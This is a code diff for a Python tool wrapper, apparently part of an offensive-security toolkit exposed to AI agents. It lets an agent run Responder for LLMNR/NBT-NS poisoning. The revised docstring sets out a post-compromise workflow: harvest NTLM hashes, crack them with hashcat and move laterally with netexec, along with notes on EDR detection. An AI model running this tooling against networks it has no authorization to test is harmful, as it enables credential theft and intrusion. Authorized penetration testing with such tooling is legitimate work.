@@ -1,29 +1,41 @@
 # mcp_tools/credential_harvest/responder.py
 
 from typing import Dict, Any
-import asyncio
+from fastmcp import Context
 
-def register_responder_tool(mcp, hexstrike_client, logger):
+def register_responder_tool(mcp, hexstrike_client, logger=None):
 
     @mcp.tool()
-    async def responder_credential_harvest(interface: str = "eth0", analyze: bool = False,
-                                   wpad: bool = True, force_wpad_auth: bool = False,
-                                   fingerprint: bool = False, duration: int = 300,
-                                   additional_args: str = "") -> Dict[str, Any]:
+    async def responder_credential_harvest(
+        ctx: Context,
+        interface: str = "eth0",
+        analyze: bool = False,
+        wpad: bool = True,
+        force_wpad_auth: bool = False,
+        fingerprint: bool = False,
+        duration: int = 300,
+        additional_args: str = ""
+    ) -> Dict[str, Any]:
         """
-        Execute Responder for credential harvesting with enhanced logging.
+        Network credential harvesting via LLMNR/NBT-NS poisoning using Responder.
 
-        Args:
-            interface: Network interface to use
-            analyze: Analyze mode only
-            wpad: Enable WPAD rogue proxy
-            force_wpad_auth: Force WPAD authentication
-            fingerprint: Fingerprint mode
-            duration: Duration to run in seconds
-            additional_args: Additional Responder arguments
+        Workflow: run on internal network after initial access to harvest NTLM hashes.
+        Captured Net-NTLMv2 hashes → hashcat -m 5600 → netexec lateral movement.
 
-        Returns:
-            Credential harvesting results
+        Parameters:
+        - interface: network interface (e.g. 'eth0', 'tun0')
+        - analyze: passive mode only — no poisoning, safe recon
+        - wpad: enable WPAD rogue proxy (captures browser proxy auth)
+        - force_wpad_auth: force WPAD auth challenge (more aggressive)
+        - fingerprint: OS fingerprinting mode
+        - duration: seconds to run (default 300)
+        - additional_args: extra Responder flags (-v, --lm)
+
+        Prerequisites: same network segment as targets, root/sudo required.
+        ⚠️ Noisy — detected by modern EDR. Use analyze=True first.
+
+        Post-capture: hashes saved to /usr/share/responder/logs/
+        hashcat_crack(hash_file='NTLMv2-*.txt', hash_type='5600', ...)
         """
         data = {
             "interface": interface,
@@ -34,13 +46,11 @@ def register_responder_tool(mcp, hexstrike_client, logger):
             "duration": duration,
             "additional_args": additional_args
         }
-        logger.info(f"🔍 Starting Responder on interface: {interface}")
-        loop = asyncio.get_running_loop()
-        result = await loop.run_in_executor(
-            None, lambda: hexstrike_client.safe_post("api/tools/responder", data)
-        )
+        mode = "analyze" if analyze else "poisoning"
+        await ctx.info(f"🔍 Starting Responder [{mode}] on {interface} for {duration}s")
+        result = hexstrike_client.safe_post("api/tools/responder", data)
         if result.get("success"):
-            logger.info(f"✅ Responder completed")
+            await ctx.info("✅ Responder completed")
         else:
-            logger.error(f"❌ Responder failed")
+            await ctx.error("❌ Responder failed")
         return result
